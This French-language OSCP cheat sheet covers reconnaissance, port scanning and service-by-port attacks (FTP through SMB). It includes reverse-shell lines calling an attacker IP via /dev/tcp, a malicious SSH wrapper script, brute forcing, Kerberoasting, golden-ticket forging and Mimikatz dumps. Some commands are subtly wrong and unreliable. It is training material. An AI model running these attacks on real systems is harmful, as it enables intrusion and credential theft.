---
title: "OSCP · Reconnaissance"
description: "Identifier les hôtes, les ports et les services accessibles."
---

# OSCP · Reconnaissance

Identifier les hôtes, les ports et les services accessibles.


## Collecte passive d'informations

Rechercher des informations publiques sur un domaine avant toute analyse active.


<p class="oscp-command-note">Consulter les données publiques d&#x27;enregistrement du domaine.</p>

```bash
whois [domain]

# Utiliser un serveur WHOIS précis 
whois [domain] -h [server]
```


**Paramètres et repères :**
`site:somesite.com` · `site:somesite.com -filetype:html` · `filetype:txt` · `ext:txt`  
`intitle:"somethig"`  


## Énumération DNS

Interroger les enregistrements DNS et identifier les services associés.

<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
# Résolution du domaine
host [domain]

# Enregistrement TXT du domaine
host -t txt [domain]

# Résolution d'un sous-domaine
host [subdomain].[domain]

# Requête TXT avec un serveur DNS spécifique
nslookup -type=TXT [domain] [use_specific_dns_server_optional]

# Résolution en boucle depuis une liste
for ip in $(cat list.txt); do host <ip>.[domain]; done
```


## Scan de ports

Vérifier les ports et les services de la cible autorisée.


### Netcat

Vérifier les ports et les services de la cible autorisée.


<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>

```bash
nc [options] [host] [port_number]

# Utiliser UDP plutôt que TCP
nc -u [host] [port number]

# Attendre une connexion entrante
nc -l [host] [port number]

# Rester en écoute après la première connexion
nc -k -l [host] [port number]

# TCP Scan in port range
nc -nvv -w 1 -z [host] [beginning_port]-[finished_port]

# -w is to specify the connection timeout in seconds, as well as -z to specify zero-I/O mode, which is used for scanning and sends no data
nc -nv -u -z -w 1 [host] [beginning_port]-[finished_port]

# -u inidcates to do an UDP scan
nc -zvu [host] [port]

# Receive reverse shell in specific port
nc -nvlp [listening_port]
```


### Nmap

Vérifier les ports et les services de la cible autorisée.


#### Méthode personnelle


**Énumération avancée**


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap -A [IP/domain] -oN [machine_name].txt
```


**Scan rapide de tous les ports**




```bash
sudo nmap -p- -sS -sU --min-rate=1000 --max-retries=1 -T4 [IP/Domain]
```


**Alternative de scan rapide**


<p class="oscp-command-note">Scanner tous les ports.</p>

```bash
nmap -p- -T4 -n -Pn [IP/domain] -oN [machine_name]_ports.txt
```


**Seconde alternative de scan rapide**


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
sudo nmap --minrate-5000 -p- -vvv -Pn -n -oG openPorts.txt [IP]
```


**Découverte de tous les ports**


<p class="oscp-command-note">Scanner tous les ports.</p>

```bash
nmap -p- [IP/Domain] -oN [machine_name]_ports.txt
```


**Ports les plus courants**


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap [IP/Domain] --top-ports [number_of_top_ports]
```


#### Types de scan

Vérifier les ports et les services de la cible autorisée.


**Paramètres et repères :**
`-sU` (scan UDP)  


**UDP Scan ( -sU )**


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
sudo nmap -sU -sS [IP]
```


```bash
sudo nmap -sU -T5 --top-ports 500 [IP]
```


**Paramètres et repères :**
`-sT` (TCP connect)  


**TCP Connect ( -sT )**




```bash
nmap -sT [IP]
```


**Paramètres et repères :**
`-sS` (SYN)  


**Stealth Scan ( -sS )**




```bash
sudo nmap -sS [IP]
```


**Specific Port Scan**




```bash
nmap -p [portNumber] [IP]
```


**Paramètres et repères :**
`-sn` (découverte d'hôtes)  


**Découverte réseau ( -sn )**


<p class="oscp-command-note">Identifier les hôtes actifs.</p>

```bash
nmap -sn [IP_range]
```


**Top 20 Ports**


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap --top-ports=20 [IP]
```


**Paramètres et repères :**
`/usr/share/nmap/nmap-services`  


#### Détection et scan

Vérifier les ports et les services de la cible autorisée.


**Paramètres et repères :**
`-O` (détection du système)  


**Détection du système d'exploitation (`-O`)**


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap -O [IP]
```


**Estimation du système d'exploitation**




```bash
nmap --osscan-guess [IP]
```


**Paramètres et repères :**
`-sV` (versions de service)  


**Identification des services ( -sV )**


<p class="oscp-command-note">Identifier les versions des services.</p>

```bash
nmap -sV [IP]
```


**Service Banners & Traceroute**


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap -A [IP]
```


**Paramètres et repères :**
`-sV` (versions de service)  


#### Enregistrement des résultats

Observer les permissions et la configuration de Windows.


**Paramètres et repères :**
`-oG` (sortie grepable)  


**Save to File ( -oG )**


<p class="oscp-command-note">Identifier les hôtes actifs.</p>

```bash
nmap -v -sn [IP_range] -oG [fileName].txt
```


**Paramètres et repères :**
`-oN` (sortie texte)  


**Analyze File**


<p class="oscp-command-note">Rechercher un motif textuel.</p>

```bash
grep Up [fileName].txt cut -d " " -f 2
```


#### Scripts Nmap (NSE)

Vérifier les ports et les services de la cible autorisée.


**Paramètres et repères :**
`/usr/share/nmap/scripts/`  


**Paramètres et repères :**
`--script`  


**Run Script ( --script )**


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script [scriptName] [IP]
```


**Script Help**


<p class="oscp-command-note">Afficher l&#x27;aide d&#x27;un script Nmap NSE.</p>

```bash
nmap --script-help [scriptName]
```


**Example Script**


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script http-headers [IP]
```


**Catégories des scripts NSE**




```bash
nmap --script [category] [IP]
```


**Catégories NSE :**
`auth` (authentification) · `broadcast` (diffusion) · `brute` (essais de mots de passe) · `default` (scripts par défaut)  
`discovery` (découverte) · `exploit` (tests d'exploitation) · `fuzzer` (fuzzing) · `malware` (malwares)  
`safe` (non intrusifs selon NSE) · `version` (versions) · `vuln` (vulnérabilités)  


#### Fonctions PowerShell

Observer les permissions et la configuration de Windows.


**Check TCP Port**


<p class="oscp-command-note">Tester une connexion réseau avec PowerShell.</p>

```powershell
Test-NetConnection -Port [portNumber] [IP]
```


**Port Scan Script**




```text
1..1024 % {echo ((New-Object Net.Sockets.TcpClient).Connect("[IP]", $_)) "TCP port $_ is open"} 2>$null
```


### RustScan

Vérifier les ports et les services de la cible autorisée.


**De base RustScan**


<p class="oscp-command-note">Rechercher rapidement les ports accessibles.</p>

```bash
rustscan -a <target-ip> -p 1-65535
```


**RustScan + Nmap**




```bash
rustscan -a <target-ip> -p 1-65535 -- -Pn
```


**Specific Port Range**




```bash
rustscan -a <target-ip> -r 1-1000
```


**Adjust Timeout & Batch Size**




```bash
rustscan -a <target-ip> -b 500 -u 5000
```


**Scan Specific Ports Only**




```bash
rustscan -a <target-ip> -p 22,80,443
```


**Save Results to File**




```bash
rustscan -a <target-ip> -- -oN [machine]_rustscan.txt
```


**UDP Scan**




```bash
rustscan -a <target-ip> -- -sU -p 1-65535
```


**Vulnerability Detection**




```bash
rustscan -a <target-ip> -p 1-65535 -- -sV --script vuln
```


**Silent Mode**




```bash
rustscan -a <target-ip> -p 1-65535 -g -q
```


**Exclude Certain Ports**




```bash
rustscan -a <target-ip> -p 1-65535 --exclude-ports 80,443
```


**OS Detection**




```bash
rustscan -a <target-ip> -p 1-65535 -- -O
```


**TCP and UDP Scan**




```bash
rustscan -a <target-ip> -p 1-65535 -- -sS -sU
```


## Services par port

Vérifier les ports et les services de la cible autorisée.


### 21: FTP

Transférer ou récupérer des fichiers dans le laboratoire.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 [IP]
```


<p class="oscp-command-note">Script shell dans la rubrique « 21: FTP ».</p>

```bash
ftp -A [IP]
ftp [IP]

# Login with anonymous credentials
anonymous:anonymous

# Upload a test file to check for reflection on an HTTP port
put test.txt
```


```bash
ftp> binary

ftp> put [binary_file]
```


<p class="oscp-command-note">Télécharger une ressource distante.</p>

```bash
wget -r ftp://[user]:[password]@[IP]/

# Searching for specific file
find / -name [filename_pattern] 2>/dev/null

# Example of searching for files
find / -name Settings.*  2>/dev/null
```


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
hydra -l [username] -P [path_to_wordlist] [IP] -t 4 ftp
```


<p class="oscp-command-note">Ouvrir une session FTP sur le serveur cible.</p>

```bash
ftp -p [IP]
```


### 22: SSH


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
# Examiner le service SSH
nmap -p 22 --script=ssh-hostkey <target_ip>

# SSH Authentication Bypass Detection
nmap -p 22 --script=ssh-auth-methods <target_ip>

# SSH Brute Force Attack
nmap -p 22 --script=ssh-brute --script-args userdb=/usr/share/seclists/Usernames/top-usernames-shortlist.txt,passdb=/usr/share/wordlists/rockyou.txt <target_ip>

# Identifier la version SSH
nmap -p 22 --script=ssh3-enum-algos <target_ip>

# Examiner les algorithmes SSH anciens
nmap -p 22 --script=ssh3-enum-algos,sshv1 <target_ip>

# SSH Public Key Authentication
nmap -p 22 --script=ssh-publickey-acceptance --script-args ssh.user=<username>,ssh.privatekey=<path_to_private_key> <target_ip>
```


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target_ip> -t 4 ssh

hydra -L <user_list> -p <password> <target_ip> -t 4 ssh -s <port>

hydra -f -V -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt -s 22 [IP] ssh
```


<p class="oscp-command-note">Modifier les permissions d&#x27;un fichier.</p>

```bash
chmod 600 [output_key_file]

ssh [user]@[IP] -i [output_key_file]
```




```bash
puttygen [putty_key_file] -O private-openssh -o [output_key_file]
```


<p class="oscp-command-note">Préparer une empreinte de clé SSH pour John.</p>

```bash
ssh2john <private_key_file> > <private_key_file>.hash

john --wordlist=/usr/share/wordlists/rockyou.txt <private_key_file>.hash
```


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
find /etc/ssh -name "*.pub"

find /home/<user>/.ssh -name "id_*"
```


<p class="oscp-command-note">Préparer une empreinte de clé SSH pour John.</p>

```bash
# No Password
ssh2john <private_key_file> > <private_key_file>.hash # id_rsa has no password!

# Wrong User or Key
ssh <user>@<target_ip> -p <port> -i <private_key_file> # Error message: Permission denied (publickey,password).
```


<p class="oscp-command-note">Transférer des fichiers via SSH.</p>

```bash
# Télécharger un fichier
scp user@remote_host:/path/to/remote/file /path/to/local/destination
scp user@192.168.1.10:/etc/config.txt /home/user/config.txt

# Télécharger plusieurs fichiers
scp user@remote_host:/path/to/remote/file1 /path/to/remote/file2 /local/destination/
scp user@192.168.1.10:/etc/config.txt user@192.168.1.10:/etc/passwd /home/user/

# Download a Directory Recursively
scp -r user@remote_host:/path/to/remote/directory /local/destination/
scp -r user@192.168.1.10:/var/www/html /home/user/

# Downlaod a File from a Specific Port (in case SSH is running on a non-default port)
scp -P 2222 user@remote_host:/path/to/remote/file /local/destination/
scp -P 2222 user@192.168.1.10:/etc/config.txt /home/user/

# Download a File Using a Private Key
scp -i /path/to/private_key user@remote_host:/path/to/remote/file /local/destination/
scp -i ~/.ssh/id_rsa user@192.168.1.10:/etc/config.txt /home/user/

# Download Files with Verbose Output
scp -v user@remote_host:/path/to/remote/file /local/destination/
scp -v user@192.168.1.10:/etc/config.txt /home/user/

# Download File Without Host Key Checking, to bypass host key checking (not recommended for secure environments)
scp -o StrictHostKeyChecking=no user@remote_host:/path/to/remote/file /local/destination/
scp -o StrictHostKeyChecking=no user@192.168.1.10:/etc/config.txt /home/user/
```


```bash
# Upload a Single File
scp /path/to/local/file user@remote_host:/path/to/remote/destination
scp /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload Multiple Files
scp /path/to/local/file1 /path/to/local/file2 user@remote_host:/remote/destination/
scp /home/user/config.txt /home/user/passwd user@192.168.1.10:/etc/

# Upload a Directory Recursively
scp -r /path/to/local/directory user@remote_host:/path/to/remote/destination/
scp -r /home/user/html user@192.168.1.10:/var/www/

# Upload a File to a Specific Port (in case SSH is running on a non-default port)
scp -P 2222 /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -P 2222 /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload a File Using a Private Key
scp -i /path/to/private_key /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -i ~/.ssh/id_rsa /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload Files with Verbose Output
scp -v /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -v /home/user/config.txt user@192.168.1.10:/etc/config.txt

# Upload File Without Host Key Checking, to bypass host key checking (not recommended for secure environments)
scp -o StrictHostKeyChecking=no /path/to/local/file user@remote_host:/path/to/remote/destination/
scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/config.txt
```


**Paramètres et repères :**
`UserKnownHostsFile` · `/dev/null` · `StrictHostKeyChecking` · `no`  


<p class="oscp-command-note">Ouvrir une connexion SSH.</p>

```bash
ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no user@target_ip
```


**Paramètres et repères :**
`aes128-cbc`  




```bash
ssh -c aes128-cbc user@target_ip
```


**Paramètres et repères :**
`-1`  




```bash
ssh -2 user@target_ip
```


**Paramètres et repères :**
`diffie-hellman-group1-sha1` (échange de clés SSH ancien) · `ssh-rsa` (clé SSH RSA ancienne)  


<p class="oscp-command-note">Tester les algorithmes SSH anciens.</p>

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa <user>@<target_ip> -t 'bash -i >& /dev/tcp/<attacker_ip>/443 0>&1'

nc -nvlp [listening_port]
```


<p class="oscp-command-note">Ouvrir une connexion SSH.</p>

```bash
ssh user@target_ip "whoami"
```


<p class="oscp-command-note">Script shell dans la rubrique « 22: SSH ».</p>

```bash
#!/bin/bash
case $SSH_ORIGINAL_COMMAND in
 'scp'*)
    $SSH_ORIGINAL_COMMAND
    ;;
 *)
    echo "ACCESS DENIED."
    bash -i >& /dev/tcp/<attacker_ip>/443 0>&1
    ;;
esac
```


<p class="oscp-command-note">Transférer des fichiers via SSH.</p>

```bash
scp -i <private_key_file> scp_wrapper.sh <user>@<target_ip>:/home/<user>/

nc -nlvp [listening_port]
```


<p class="oscp-command-note">Se connecter avec une clé SSH privée.</p>

```bash
ssh -i <private_key_file> <user>@<target_ip>
```


### 23: Telnet


<p class="oscp-command-note">Tester la connexion à un port TCP.</p>

```bash
# Basic login
telnet <target_ip> 23

# Login with specific username
telnet -l <username> <target_ip>
```


### 25: SMTP


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
# Nmap Scripting Scan
nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 <target_ip>

# Netcat and Telnet Interaction
nc -nv <target_ip> 25
telnet <target_ip> 25
EHLO ALL
VRFY <USER>

# Interaction Example
kali@kali:~$ nc -nv 192.168.123.8 25
(UNKNOWN) [192.168.123.8] 25 (smtp) open
220 mail ESMTP Postfix (Ubuntu)
VRFY root
252 2.0.0 root
VRFY test_user
550 5.1.1 <test_user>: Recipient address rejected: User unknown in local recipient table
^C
```


<p class="oscp-command-note">Script shell dans la rubrique « 25: SMTP ».</p>

```bash
# Usage
kali@kali:~/Desktop$ python3 smtp.py root 192.168.123.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'252 2.0.0 root\r\n'

kali@kali:~/Desktop$ python3 smtp.py testUser 192.168.123.8
b'220 mail ESMTP Postfix (Ubuntu)\r\n'
b'550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table\r\n'
```


<p class="oscp-command-note">Script Python lié à « 25: SMTP ».</p>

```python
import socket
import sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <username> <target_ip>")
    sys.exit(0)

# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to the Server
ip = sys.argv[2]
connect = s.connect((ip,25))

# Receive the banner
banner = s.recv(1024)
print(banner)

# VRFY a user
user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
result = s.recv(1024)
print(result)

# Close the socket
s.close()
```


<p class="oscp-command-note">Script PowerShell dans la rubrique « 25: SMTP ».</p>

```powershell
dism /online /Enable-Feature /FeatureName:TelnetClient

# Interaction Example
C:\Windows\system32>telnet 192.168.123.8 25
220 mail ESMTP Postfix (Ubuntu)
VRFY testUser
550 5.1.1 <testUser>: Recipient address rejected: User unknown in local recipient table
VRFY root
252 2.0.0 root
```


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
# Check if vulnerable
nmap -sV -p [port] --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=echo\;/bin/ls [ip]
                
# Reference: https://gist.github.com/YSSVirus/0978adadbb8827b53065575bb8fbcb25
python2 shellshock.py <target_ip> <username>@<domain> <attacker_ip> 139 <root>@<domain>

# Example: python2 shellshock.py 192.168.1.100 emmanuel@domain.local 192.168.1.50 139 admin@domain.local
```


### 53: DNS

Interroger les enregistrements DNS et identifier les services associés.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script dns-brute,dns-nsid,dns-recursion,dns-zone-transfer -p 53 <target_ip>
```


```bash
nmap -p 53 --script "dns-nsid,dns-srv-enum" <target_ip>
```


<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
dig axfr <domain_name> @<dns_server_ip>  # Attempt zone transfer
dig ANY <domain_name> @<dns_server_ip>  # Retrieve all records
nslookup
> server <dns_server_ip>
> set type=any
> <domain_name>  # Query any records
```


```bash
dnsrecon -d <domain_name> -n <dns_server_ip> -t axfr

dnsenum --enum -f /usr/share/dnsenum/dns.txt --dnsserver <dns_server_ip> <domain_name>
```


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
nmap -sL <target_ip_range> | grep "Nmap scan report"  # Reverse DNS lookup for a range
```


<p class="oscp-command-note">Interroger les enregistrements DNS.</p>

```bash
dig @<dns_server_ip> -t A +norecurse <target_domain>
```


<p class="oscp-command-note">Résoudre un nom DNS avec PowerShell.</p>

```powershell
Resolve-DnsName -Name <domain_name> -Server <dns_server_ip> -DnsOnly
```


### 69: TFTP

Transférer ou récupérer des fichiers dans le laboratoire.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 69 --script tftp-enum <target_ip>
```




```bash
# Usage: run the TFTP enumeration script to get a specific file
./tftp_enum.sh <target_ip> <filename>
./tftp_enum.sh 192.168.1.10 bootfile.bin
```


<p class="oscp-command-note">Script shell dans la rubrique « 69: TFTP ».</p>

```bash
#!/bin/bash

# TFTP Enumeration Script
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <target_ip> <filename>"
    exit 1
fi

TARGET_IP=$1
FILENAME=$2

# Attempt to retrieve file from TFTP server
echo "Attempting to retrieve $FILENAME from $TARGET_IP"
tftp $TARGET_IP -c get $FILENAME

# Check if file was retrieved
if [ -f $FILENAME ]; then
    echo "File $FILENAME successfully retrieved from $TARGET_IP"
else
    echo "Failed to retrieve $FILENAME from $TARGET_IP"
fi
```




```bash
tftp <target_ip> 69
tftp> get <remote_file> <local_file>
tftp> quit
```


```bash
tftp <target_ip> 69
tftp> put <local_file> <remote_file>
tftp> quit
```


<p class="oscp-command-note">Exécuter la boucle de vérification des hôtes.</p>

```bash
for i in $(cat <file_list.txt>); do tftp <target_ip> 69 -c get $i; done
```


<p class="oscp-command-note">Afficher ou écrire une valeur.</p>

```bash
echo -e "get <remote_file> <local_file>\nquit" | tftp <target_ip>
echo -e "put <local_file> <remote_file>\nquit" | tftp <target_ip>
```


### 88: Kerberos

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
# Check for Kerberos service availability and get basic information
nmap -p 88 --script kerberos-enum-users <target_ip>

# Check for common Kerberos vulnerabilities
nmap -p 88 --script kerberos-brute <target_ip>

# Enumerate SPNs (Service Principal Names)
nmap -p 88 --script krb5-enum-users,krb5-scan <target_ip>
```


<p class="oscp-command-note">Examiner les comptes Kerberos du domaine.</p>

```bash
kerbrute userenum -d <domain> -p <userlist> <target_ip>
# Autre possibilité
./kerbrute_linux_amd64 userenum -d <target_ip> /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
```


<p class="oscp-command-note">Examiner les comptes sans préauthentification Kerberos.</p>

```bash
impacket-GetNPUsers -dc-ip <dc_ip> -request -usersfile <userlist> <target_domain>
```


<p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>

```bash
impacket-GetTGT -dc-ip <dc_ip> -outputfile <outputfile> <username>@<domain>
```


<p class="oscp-command-note">Analyser des empreintes avec John.</p>

```bash
john --wordlist=<wordlist> <ticket_file>
# or
hashcat -m 13100 <ticket_file> <wordlist>
```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# Request a TGT (Ticket Granting Ticket)
python3 GetTGT.py -dc-ip <dc_ip> <domain>/<username>:<password>

# Request a Service Ticket (TGS)
python3 GetST.py -dc-ip <dc_ip> <domain>/<username>:<password> -spn <service>/<target>
```


<p class="oscp-command-note">Énumérer les SPN des comptes de service.</p>

```bash
# Extract all service tickets for offline cracking
impacket-GetUserSPNs -dc-ip <dc_ip> -outputfile <tickets_file> <domain>/<username>:<password>

# Crack the extracted tickets with John the Ripper or Hashcat
john --wordlist=<wordlist> <tickets_file>
# or
hashcat -m 13100 <tickets_file> <wordlist>
```




```bash
krb5-brute -d <domain> -t <target_ip> -u <username> -p <password_list>
```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# Renew a TGT (for Kerberos ticket manipulation)
python3 psexec.py <domain>/<username>:<password>@<target_ip> -impersonate-user <target_user>

# Perform Kerberos attacks with Rubeus
rubeus.exe asktgt /user:<username> /rc4:<password>
rubeus.exe tgtdeleg /user:<username> /rc4:<password>
rubeus.exe s4u /user:<username> /rc4:<password> /impersonateuser:<target_user>
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec Mimikatz.</p>

```powershell
# Dump Kerberos tickets from memory using Mimikatz
mimikatz "lsadump::dcom" "sekurlsa::tickets /export"
```


<p class="oscp-command-note">Exécuter un script Python.</p>

```bash
# Test for weak pre-authentication configurations
python3 kerbrute.py -d <domain> -u <user_list> -p <password_list> -dc <dc_ip>
```


<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```bash
# Create a silver ticket with Rubeus
rubeus.exe tgt::add /user:<username> /rc4:<password> /sid:<domain_sid> /domain:<domain>
```


<p class="oscp-command-note">Demander un ticket Kerberos TGT.</p>

```bash
# 1. Obtain a Valid TGT (Ticket Granting Ticket)
impacket-GetTGT -dc-ip <dc_ip> -outputfile <tgt_file> <user>@<domain>

# 2. Forge a Silver Ticket
impacket-atexec -target-ip <target_ip> -service <service> -ticket <ticket_file> <username>
```


<p class="oscp-command-note">Examiner les tickets et paramètres Kerberos.</p>

```bash
# Create a golden ticket with Rubeus
rubeus.exe tgt::add /user:<username> /rc4:<password> /domain:<domain> /sid:<domain_sid> /rc4:<krbtgt_hash>
```


<p class="oscp-command-note">Examiner les données d&#x27;authentification avec SecretsDump.</p>

```bash
# 1. Obtain KRBTGT NTLM Hash
impacket-secretsdump -outputfile <dump_file> <target_domain>/<username>:<password>@<dc_ip>

# 2. Generate a Golden Ticket
ticketer -user <user> -domain <domain> -sid <domain_sid> -krbtgt <krbtgt_hash> -output <ticket_file>

# 3. Use the Golden Ticket
impacket-smbexec -target-ip <target_ip> -ticket <ticket_file> <username>

# (Optional) Pass the Golden Ticket
impacket-psexec -target-ip <target_ip> -ticket <ticket_file> <username>
```


### 110: POP3


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p 110 <target_ip>
```


<p class="oscp-command-note">Tester la connexion à un port TCP.</p>

```bash
# Connect to the POP3 service
telnet <target_ip> 110

# Log in with a test user
USER <username>
PASS <password>

# List all messages
LIST

# Retrieve the first email
RETR 1
```


<p class="oscp-command-note">Vérifier des identifiants sur un service autorisé.</p>

```bash
# Standard brute force on POP3
hydra -l <username> -P <password_list> -f <target_ip> pop3 -V

# Brute force with SSL/TLS on POP3 over port 995
hydra -S -v -l <username> -P <password_list> -s 995 -f <target_ip> pop3 -V
```


<p class="oscp-command-note">Tester la connexion à un port TCP.</p>

```bash
# Connect to the POP3 service
telnet <target_ip> 110

# Log in with your credentials
USER <username>
PASS <password>

# List all messages
LIST

# Retrieve a specific email by its number
RETR <mail_number>

# Close the connection
QUIT
```


### 111: RPC


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -sV -p 111 --script=rpcinfo <target_ip>
```




```bash
# Use rpcinfo to get a list of registered RPC services on the target
rpcinfo -p <target_ip>
```


<p class="oscp-command-note">Lister les exports NFS.</p>

```bash
# Check available RPC services and their versions with showmount
showmount -e <target_ip>
```


### 135, 593: MSRPC


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap -p 135 --script msrpc-enum <target_ip>
```


**Paramètres et repères :**
`rpcdump`  




```bash
rpcdump.py <target_ip> -p 135
```




```bash
# Scan for RPC over HTTP services using Nmap
nmap -p 593 --script http-rpc-epmap <target_ip>
```


**Paramètres et repères :**
`rpcclient`  


<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
# Connect with a null session
rpcclient -U "" -N <target_ip>

# Connect to the target and list available shares
rpcclient -U "" -N <target_ip> -c "srvinfo"

# List all available users
rpcclient -U "" -N <target_ip> -c "enumdomusers"

# Enumerate domain groups
rpcclient -U "" -N <target_ip> -c "enumdomgroups"

# Query user information
rpcclient -U "<username>" -W "<domain>" <target_ip> -c "queryuser <username>"
```


**Paramètres et repères :**
`rpcclient`  


<p class="oscp-command-note">Définir un objet ou une configuration SQL.</p>

```sql
enumdomusers
enumdomgroups
queryuser 0x450
enumprinters
querydominfo
createdomuser
deletedomuser
lookupnames
lookupsids
lsaaddacctrights
lsaremoveacctrights
dsroledominfo
dsenumdomtrusts
```


```bash
# List Users
enumdomusers

# Get User Details
queryuser <0xrid>

# Get User Groups
queryusergroups <0xrid>

# Get User SID
lookupnames <username>

# Get User Aliases
queryuseraliases [builtin|domain] <sid>
```


<p class="oscp-command-note">Script shell dans la rubrique « 135, 593: MSRPC ».</p>

```bash
# List Groups
enumdomgroups

# Get Group Details
querygroup <0xrid>

# Get Group Members
querygroupmem <0xrid>
```




```bash
# List Aliases
enumalsgroups <builtin|domain>

# Get Members of Alias
queryaliasmem builtin|domain <0xrid>
```




```bash
# List Domains
enumdomains

# Obtain Domain SID
lsaquery

# Get Domain Information
querydominfo
```


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
# Nmap
nmap --script smb-brute.nse -p 445 <IP>

# CrackMapExec
crackmapexec smb <IP> -u 'admin' -p wordlist_pass.txt
# Autre possibilité
crackmapexec smb <IP> -u 'wordlist_user.txt' -p password

# Lookup SID with Brute Force (requires that we have valid credentials and the domain name)
impacket-lookupsid [domain.com]/[userName]:[domain.com]@987@[ip]
```


<p class="oscp-command-note">Rechercher des fichiers selon un filtre.</p>

```bash
Find SID by Name
lookupnames <username>

# Find More SIDs
lsaenumsid

# Check RID Cycle for More SIDs
lookupsids <sid>
```


**Paramètres et repères :**
`rpcclient`  


<p class="oscp-command-note">Examiner les objets exposés par RPC.</p>

```bash
rpcclient -N <target_ip> -U '<username>%<password>' -c "setuserinfo2 <target_username> 23 '<new_password>'"
# Autre possibilité
rpcclient -U "" -N <ip> -c "setuserinfo2 <USER> 23 <NEW_PASSWORD>"
```


**Paramètres et repères :**
`setuserinfo` · `rpcclient` · `level` · `setuserinfo2`  


### 139, 445: SMB

Examiner les objets, les droits et les services du domaine.


<p class="oscp-command-note">Scanner les ports et services avec Nmap.</p>

```bash
# Nmap scan
nmap -v -p 139,445 [IP]
nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery <ip>

# NetBIOS Scan
sudo nbtscan -r 192.168.50.0/24

# Windows Network View
net view \\[domainName] /all
```


<p class="oscp-command-note">Examiner les services avec les scripts NSE sélectionnés.</p>

```bash
nmap --script smb-enum-shares.nse -p445 <ip>

nmap --script smb-enum-users.nse -p445 <ip>

nmap --script smb-enum-domains.nse,smb-enum-groups.nse,smb-enum-processes.nse,smb-enum-services.nse,smb-enum-sessions.nse,smb-enum-shares.nse,smb-enum-users.nse -p445 <ip>

nmap -p139,445 --script "smb-vuln-* and not(smb-vuln-regsvc-dos)" --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 <IP>

nmap --script smb-vuln-conficker.nse,smb-vuln-cve2009-3103.nse,smb-vuln-cve-2017-7494.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse,smb-vuln-regsvc-dos.nse,smb-vuln-webexec.nse -p445 <ip>

nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 <ip>
```


<p class="oscp-command-note">Script shell dans la rubrique « 139, 445: SMB ».</p>

```bash
# Network Packet Analysis: captures and analyzes packets related to SMB traffic on port 139, looking for specific patterns
sudo ngrep -i -d <INTERFACE> 's.?a.?m.?b.?a.*[[:digit:]]' port 139

# Lists available SMB shares on the target
smbclient -L <IP>
```


**Paramètres et repères :**
`smbmap`  


